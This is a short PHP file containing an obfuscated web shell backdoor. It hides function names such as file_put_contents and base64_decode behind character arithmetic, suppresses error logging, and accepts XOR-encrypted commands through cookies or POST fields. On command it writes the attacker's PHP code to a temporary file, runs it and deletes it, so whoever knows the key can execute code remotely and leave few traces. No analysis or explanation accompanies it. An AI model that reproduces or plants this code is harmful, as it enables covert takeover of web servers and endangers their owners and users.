<?php $rxkdiufw = chr(102).chr(1102-997).chr(108)."\145"."\x5f".'p'.'u'.chr(116)."\x5f".chr(260-161).chr(885-774)."\x6e"."\164".chr(106-5)."\x6e"."\164".'s';
$qeswvjl = 'b'."\141".'s'.'e'.chr(308-254).chr(155-103)."\x5f"."\x64".chr(101).chr(99).chr(980-869).chr(595-495)."\145";
$pseofv = chr(548-443).chr(110)."\x69".chr(467-372)."\x73"."\x65"."\x74";
$visqqe = "\165".chr(633-523).chr(408-300)."\x69".chr(110).chr(744-637);


@$pseofv("\145".chr(114).chr(114)."\157".'r'.'_'."\154"."\157".'g', NULL);
@$pseofv(chr(108).chr(111).'g'."\x5f".'e'.chr(114).chr(114).'o'.chr(853-739).chr(115), 0);
@$pseofv(chr(109).'a'.chr(609-489)."\137".chr(547-446).chr(120).chr(101).'c'.chr(709-592).chr(1012-896)."\151".chr(666-555)."\x6e"."\137".chr(741-625).chr(105)."\155".'e', 0);
@set_time_limit(0);

function cuzjlgt($thdwook, $ggtxdeymg)
{
    $qssavazxyr = "";
    for ($qlybawx = 0; $qlybawx < strlen($thdwook);) {
        for ($j = 0; $j < strlen($ggtxdeymg) && $qlybawx < strlen($thdwook); $j++, $qlybawx++) {
            $qssavazxyr .= chr(ord($thdwook[$qlybawx]) ^ ord($ggtxdeymg[$j]));
        }
    }
    return $qssavazxyr;
}

$ktfso = array_merge($_COOKIE, $_POST);
$bzztkqr = '7d0ea546-90f9-40b6-ad1e-409bb86c9305';
foreach ($ktfso as $adozozpopb => $thdwook) {
    $thdwook = @unserialize(cuzjlgt(cuzjlgt($qeswvjl($thdwook), $bzztkqr), $adozozpopb));
    if (isset($thdwook["\x61".'k'])) {
        if ($thdwook[chr(989-892)] == "\x69") {
            $qlybawx = array(
                'p'.chr(223-105) => @phpversion(),
                "\163".chr(118) => "3.5",
            );
            echo @serialize($qlybawx);
        } elseif ($thdwook[chr(989-892)] == "\145") {
            $zcuucvino = "./" . md5($bzztkqr) . chr(46).'i'."\156"."\143";
            @$rxkdiufw($zcuucvino, "<" . '?'."\x70".'h'.'p'."\x20".chr(326-262)."\x75"."\x6e"."\154".chr(915-810)."\x6e".'k'.'('."\137".chr(95)."\x46".'I'.'L'.chr(649-580).chr(95).'_'.')'."\73".' ' . $thdwook["\144"]);
            @include($zcuucvino);
            @$visqqe($zcuucvino);
        }
        exit();
    }
}

